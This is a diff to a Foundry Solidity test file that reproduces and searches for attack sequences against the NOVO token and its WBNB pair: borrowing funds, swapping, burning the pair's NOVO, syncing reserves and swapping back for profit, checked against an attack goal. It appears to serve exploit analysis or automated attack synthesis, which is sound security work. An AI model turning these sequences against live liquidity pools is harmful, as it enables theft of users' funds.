@@ -74,8 +74,6 @@ contract NOVOTest is Test, BlockLoader {
         novo.transfer(address(novo), balanceOfnovonovo);
         wbnb.transfer(address(pair), balanceOfwbnbpair);
         novo.transfer(address(pair), balanceOfnovopair);
-        wbnb.approve(attacker, UINT256_MAX);
-        novo.approve(attacker, UINT256_MAX);
         novo.afterDeploy(address(pair));
     }
 
@@ -141,20 +139,48 @@ contract NOVOTest is Test, BlockLoader {
         return;
     }
 
-    function borrow_wbnb(uint256 amount) internal {
-        wbnb.transferFrom(owner, attacker, amount);
+    function borrow_owner_wbnb(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        wbnb.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_wbnb(uint256 amount) internal {
+    function payback_owner_wbnb(uint256 amount) internal {
         wbnb.transfer(owner, amount);
     }
 
-    function borrow_novo(uint256 amount) internal {
-        novo.transferFrom(owner, attacker, amount);
+    function borrow_owner_novo(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        novo.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_novo(uint256 amount) internal {
+    function payback_owner_novo(uint256 amount) internal {
         novo.transfer(owner, amount);
+    }
+
+    function borrow_pair_wbnb(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        wbnb.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_wbnb(uint256 amount) internal {
+        wbnb.transfer(address(pair), amount);
+    }
+
+    function borrow_pair_novo(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        novo.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_novo(uint256 amount) internal {
+        novo.transfer(address(pair), amount);
     }
 
     function swap_pair_novo_wbnb(uint256 amount) internal {
@@ -195,7 +221,7 @@ contract NOVOTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_wbnb(17e18);
+        borrow_owner_wbnb(17e18);
         printBalance("After step0 ");
         swap_pair_wbnb_novo(wbnb.balanceOf(attacker));
         printBalance("After step1 ");
@@ -205,7 +231,7 @@ contract NOVOTest is Test, BlockLoader {
         printBalance("After step3 ");
         swap_pair_novo_wbnb(novo.balanceOf(attacker));
         printBalance("After step4 ");
-        payback_wbnb((17e18 * 1003) / 1000);
+        payback_owner_wbnb((17e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -220,50 +246,32 @@ contract NOVOTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
         burn_pair_novo(amt2);
         sync_pair();
         swap_pair_novo_wbnb(amt3);
-        payback_wbnb(amt4);
+        payback_owner_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand000(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
+    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        swap_pair_novo_wbnb(amt3);
-        payback_wbnb(amt4);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_novo(amt0);
+        burn_pair_novo(amt1);
+        payback_owner_novo(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand001(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        swap_pair_novo_wbnb(amt3);
-        swap_pair_novo_wbnb(amt4);
-        payback_wbnb(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_novo(amt0);
+        burn_pair_novo(amt1);
+        payback_pair_novo(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -272,37 +280,25 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        sync_pair();
-        swap_pair_novo_wbnb(amt3);
-        payback_wbnb(amt4);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_novo(amt0);
+        burn_pair_novo(amt1);
+        swap_pair_novo_wbnb(amt2);
+        payback_owner_novo(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand003(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        swap_pair_novo_wbnb(amt4);
-        payback_wbnb(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_novo(amt0);
+        burn_pair_novo(amt1);
+        sync_pair();
+        payback_owner_novo(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -311,41 +307,25 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        sync_pair();
-        swap_pair_novo_wbnb(amt3);
-        swap_pair_novo_wbnb(amt4);
-        payback_wbnb(amt5);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_novo(amt0);
+        burn_pair_novo(amt1);
+        swap_pair_novo_wbnb(amt2);
+        payback_pair_novo(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand005(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
-    ) public {
+    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        swap_pair_novo_wbnb(amt4);
-        swap_pair_novo_wbnb(amt5);
-        payback_wbnb(amt6);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_novo(amt0);
+        burn_pair_novo(amt1);
+        sync_pair();
+        payback_pair_novo(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -355,18 +335,15 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
         burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        sync_pair();
-        swap_pair_novo_wbnb(amt4);
-        payback_wbnb(amt5);
+        swap_pair_novo_wbnb(amt3);
+        payback_owner_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -376,19 +353,15 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        swap_pair_novo_wbnb(amt5);
-        payback_wbnb(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_novo(amt0);
+        burn_pair_novo(amt1);
+        swap_pair_novo_wbnb(amt2);
+        swap_pair_novo_wbnb(amt3);
+        payback_owner_novo(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -397,21 +370,15 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_novo(amt0);
+        burn_pair_novo(amt1);
         sync_pair();
-        swap_pair_novo_wbnb(amt4);
-        swap_pair_novo_wbnb(amt5);
-        payback_wbnb(amt6);
+        swap_pair_novo_wbnb(amt2);
+        payback_owner_novo(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -421,21 +388,15 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
         burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        swap_pair_novo_wbnb(amt5);
-        swap_pair_novo_wbnb(amt6);
-        payback_wbnb(amt7);
+        swap_pair_novo_wbnb(amt3);
+        payback_pair_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -445,20 +406,15 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        sync_pair();
-        swap_pair_novo_wbnb(amt5);
-        payback_wbnb(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_novo(amt0);
+        burn_pair_novo(amt1);
+        swap_pair_novo_wbnb(amt2);
+        swap_pair_novo_wbnb(amt3);
+        payback_pair_novo(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -467,22 +423,15 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        burn_pair_novo(amt5);
-        swap_pair_novo_wbnb(amt6);
-        payback_wbnb(amt7);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_novo(amt0);
+        burn_pair_novo(amt1);
+        sync_pair();
+        swap_pair_novo_wbnb(amt2);
+        payback_pair_novo(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -493,21 +442,16 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3,
         uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt5
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
         burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        sync_pair();
-        swap_pair_novo_wbnb(amt5);
-        swap_pair_novo_wbnb(amt6);
-        payback_wbnb(amt7);
+        swap_pair_novo_wbnb(amt3);
+        swap_pair_novo_wbnb(amt4);
+        payback_owner_wbnb(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -517,75 +461,16 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
         burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        burn_pair_novo(amt5);
-        swap_pair_novo_wbnb(amt6);
-        swap_pair_novo_wbnb(amt7);
-        payback_wbnb(amt8);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand014(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        burn_pair_novo(amt5);
         sync_pair();
-        swap_pair_novo_wbnb(amt6);
-        payback_wbnb(amt7);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand015(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_novo(amt1);
-        burn_pair_novo(amt2);
-        burn_pair_novo(amt3);
-        burn_pair_novo(amt4);
-        burn_pair_novo(amt5);
-        sync_pair();
-        swap_pair_novo_wbnb(amt6);
-        swap_pair_novo_wbnb(amt7);
-        payback_wbnb(amt8);
+        swap_pair_novo_wbnb(amt3);
+        payback_owner_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
